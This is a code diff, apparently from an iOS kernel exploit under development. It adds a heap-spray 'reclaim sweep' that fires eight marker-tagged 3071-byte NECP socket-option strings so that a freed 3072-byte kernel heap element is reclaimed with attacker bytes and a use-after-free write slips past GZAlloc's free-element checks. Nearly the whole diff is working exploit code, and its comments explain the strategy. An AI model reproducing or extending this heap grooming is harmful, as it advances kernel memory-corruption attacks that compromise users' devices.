@@ -231,30 +231,51 @@ static void p130_bandit(const char *outcome) {
         Lf(@"[v2-GROW] %d surfaces held — the registry map crossed the 192-cap "
            @"(the old 3072 element kfree_data'd at the growth)", p130grown);
 
-        /* (a) the NECP long-string attempt: kalloc(strlen+1) → 3072 at 3071 */
+        /* v3.2 (2026-11-22, the 3/3 "free won" receipts): THE RECLAIM SWEEP.
+           The single string never consumed the freed old-map element — the
+           marshal's spill found it still on the freelist and GZAlloc caught
+           the write ("element modified after free" x3: 13:11, 17:07, 03:36).
+           Fire EIGHT 3071-B TLV strings on eight DISTINCT sockets, each
+           with a RECOGNIZABLE per-slot marker (the 'N'-fill + the slot id
+           at the head) — sweeping the 3072 freelist top so the freed
+           element takes OUR bytes. The spill then lands in a LIVE element
+           (GZAlloc guards only free elements) = SURVIVED + our marker
+           inside the write's landing zone = the readable receipt the P114
+           diff then observes. */
         {
-            int sfd = socket(AF_INET, SOCK_DGRAM, 0);
-            int necpOK = 0, necpErr = 0;
-            if (sfd >= 0) {
+            int sweepOK = 0, sweepErr = 0;
+            for (int slot = 0; slot < 8; slot++) {
+                int sfd = socket(AF_INET, SOCK_DGRAM, 0);
+                if (sfd < 0) { sweepErr = errno; continue; }
                 unsigned char tlv[3071 + 4];
                 tlv[0] = 0x07;                       /* the A14 working TLV type */
                 tlv[1] = 0;
                 tlv[2] = (unsigned char)((3071 >> 8) & 0xff);
                 tlv[3] = (unsigned char)(3071 & 0xff);
                 memset(tlv + 4, 'N', 3071);
+                /* the per-slot marker: the slot id at the head + a tail
+                   signature — recognizable in any readback channel */
+                tlv[4] = (unsigned char)('0' + slot);
+                tlv[5] = 0xB1; tlv[6] = 0x30; tlv[7] = (unsigned char)slot;
+                {
+                    unsigned char *tail = tlv + 4 + 3071 - 8;
+                    tail[0] = 0xDE; tail[1] = 0xAD; tail[2] = 0x30;
+                    tail[3] = 0x7A;  tail[4] = 'S';  tail[5] = 'W';
+                    tail[6] = (unsigned char)('0' + slot);
+                    tail[7] = 0xE7;
+                }
                 if (setsockopt(sfd, 0xffff /* SOL_SOCKET */,
                                0x1109 /* SO_NECP_ATTRIBUTES */,
                                tlv, (socklen_t)sizeof tlv) == 0)
-                    necpOK = 1;
-                else
-                    necpErr = errno;
+                    sweepOK++;
+                else if (!sweepErr) sweepErr = errno;
                 close(sfd);
             }
-            Lf(@"[v2-RECLAIM-a] NECP 3071-B TLV: %@ (errno=%d) — %@",
-               necpOK ? @"ACCEPTED (a 3072 kalloc_data claimed)" : @"rejected",
-               necpErr,
-               necpOK ? @"the channel CARRIES 3072" :
-               @"the channel caps below 3072 (the A14 255 law) — the OSData row is the fallback");
+            Lf(@"[v3.2-RECLAIM-SWEEP] 8x NECP 3071-B TLV: %d/8 accepted "
+               "(errno=%d) — %d x 3072-class kalloc_data with per-slot "
+               "markers swept the freelist; the freed element should now "
+               "hold OUR bytes when the marshal spills",
+               sweepOK, sweepErr, sweepOK);
         }
 
         /* (b) the OSData property attempt: a 3072-byte CFData on IOSurfaceRoot */
